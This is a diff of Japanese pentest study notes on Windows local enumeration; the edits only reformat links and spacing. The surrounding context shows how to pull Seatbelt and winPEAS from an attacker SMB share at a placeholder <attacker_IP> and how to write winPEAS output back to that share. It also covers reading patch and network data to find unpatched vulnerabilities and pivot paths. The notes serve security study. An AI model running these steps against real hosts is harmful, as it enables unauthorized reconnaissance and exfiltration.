@@ -23,7 +23,7 @@
 理由は、複数のツールでスキャンすることで、異なる結果や見逃しに気付くことができるから。
 また、必ず手動でのスキャンを実施する。
 
-[Seatbelt](https://github.com/GhostPack/Seatbelt)
+🔗[Seatbelt](https://github.com/GhostPack/Seatbelt)
 ```zsh
 # Attacker
 mkdir share
@@ -41,7 +41,7 @@ cp \\<attacker_IP>\share\Seatbelt.exe .
 	- `system`：OSの設定、パッチ状況、サービスなどのシステム情報を調査
 	- `user`：ユーザーごとの設定、保存された認証情報、履歴などを調査
 
-[WinPEAS](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md)
+🔗[WinPEAS](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md)
 ```zsh
 # Attacker
 mkdir share
@@ -56,7 +56,7 @@ cp \\<attacker_IP>\share\winPEASx64.exe .
 .\winPEASx64.exe | Tee-Object -FilePath \\<attacker_IP>\share\peas_result.txt
 ```
 
-- 補足：[🔍Windows Local Enumeration](#Windows用列挙ツール一覧)
+- 補足：[Windows用列挙ツール一覧](#Windows用列挙ツール一覧)
 
 ---
 
@@ -67,7 +67,7 @@ cp \\<attacker_IP>\share\winPEASx64.exe .
 - どのユーザー・グループが特権を持っていそうかを明らかにする
 - どのユーザー・グループがRDP / WinRM接続可能かを明らかにする
 	- →ユーザーの列挙が最短のPEベクター
-- 補足：[🔍Windows Local Enumeration](#管理者のアカウント運用について)
+- 補足：[管理者のアカウント運用について](#管理者のアカウント運用について)
 
 > [!TIP] 着目ポイント
 > - `admin`：adminが含まれるユーザー・グループは特権をもつ可能性
@@ -137,7 +137,7 @@ OS・バージョン・アーキテクチャの表示
 systeminfo
 ```
 - `OS Name`
-- `OS Version xxxx Build <num>`：Buildの番号を[List of Microsoft Windows versions - Wikipedia](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions)で検索することで、詳細で**正確**なOSバージョンがわかる
+- `OS Version xxxx Build <num>`：Buildの番号を🔗[List of Microsoft Windows versions - Wikipedia](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions)で検索することで、詳細で**正確**なOSバージョンがわかる
 - `System Type`：64bitか32bitかで使用できるPEファイルが異なる
 
 `Systeminfo`がAccess deniedの場合
@@ -155,9 +155,11 @@ reg query "HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0" /v Identifier
 Get-CimInstance -Class win32_quickfixengineering | 
 Where-Object { $_.Description -eq "Security Update" }
 ```
-- インストールされたセキュリティパッチをメモし、ターゲットのOSを[Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/deployments)のページで検索し、未修正の脆弱性を明らかにする
+- インストールされたセキュリティパッチをメモし、ターゲットのOSを🔗[Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/deployments)のページで検索し、未修正の脆弱性を明らかにする
 	- 日付範囲は１年のみ選択可能
+
 ![](../../画像ファイル/Pasted%20image%2020250823155239.png)
+
 $$MSRCの検索結果$$
 
 ---
@@ -185,7 +187,7 @@ Active Connections
 ```
 - `State LISTINING`：そのポートで何かのサービスが動作している
 - `State ESTABLISHED`：現在使用中
-- ==ポート番号から、動作しているサービスを推測できる==し、[🔍Windows Local Enumeration](#実行中のプロセスの列挙)で列挙したPIDと突合して、どのポートでどのサービスが動作しているかを確定できる
+- ==ポート番号から、動作しているサービスを推測できる==し、[実行中のプロセスの列挙](#実行中のプロセスの列挙)で列挙したPIDと突合して、どのポートでどのサービスが動作しているかを確定できる
 - 補足：[🔍Windows Local Enumeration](#ルーティングテーブルの見方)
 
 すべてのネットワークインターフェース情報
@@ -201,6 +203,7 @@ ipconfig /all
 >- たとえば次の画像では、サブネットが異なるIPが確認できるので、このホストを使ってポートフォワーディングすれば、別のネットワークにアクセスできる可能性がある
 
 ![](../../画像ファイル/Pasted%20image%2020251118082433.png)
+
 $$ipconfigの結果例$$
 
 ルーティングテーブル
@@ -516,6 +519,7 @@ reg query "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\Firewa
 ## ルーティングテーブルの見方
 
 ![](../../画像ファイル/Pasted%20image%2020250724124100.png)
+
 $$ルーティングテーブルの例$$
 
 ### セクション一覧
